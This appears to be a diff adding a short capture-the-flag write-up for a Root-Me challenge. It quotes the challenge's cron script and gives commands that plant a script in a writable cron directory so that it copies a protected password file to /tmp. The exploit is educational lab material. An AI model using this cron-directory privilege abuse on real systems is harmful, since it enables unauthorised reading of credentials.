@@ -1,0 +1,43 @@
+Task on RootMe: https://www.root-me.org/en/Challenges/App-Script/Bash-cron
+Video Solution: https://youtu.be/EAjhxysbx4E
+
+$ cat ch4
+
+#!/bin/bash
+
+# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)
+
+# Output of the command 'crontab -l' run as app-script-ch4-cracked:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# You do NOT need to edit the crontab (it's chattr +i anyway)
+
+# hiding stdout/stderr
+exec 1>/dev/null 2>&1
+
+wdir="cron.d/"
+challdir=${0%/*}
+cd "$challdir"
+
+
+if [ ! -e "/tmp/._cron" ]; then
+    mkdir -m 733 "/tmp/._cron"
+fi
+
+ls -1a "${wdir}" | while read task; do
+    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
+    	timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
+    fi
+    rm -f "${PWD}/${wdir}${task}"
+done
+
+rm -rf cron.d/*
+
+We can write our bash scripts inside cron.d directory. Let's write script that read from file .passwd.
+$ echo "cat .passwd > /tmp/passwd_glicOne"
+and give to this script all permissions.
+$ chmod 777 cron.d/script.sh
+Wait for cron to run and cat our tmp file
+$ cat /tmp/passwd_glicOne
+Done.
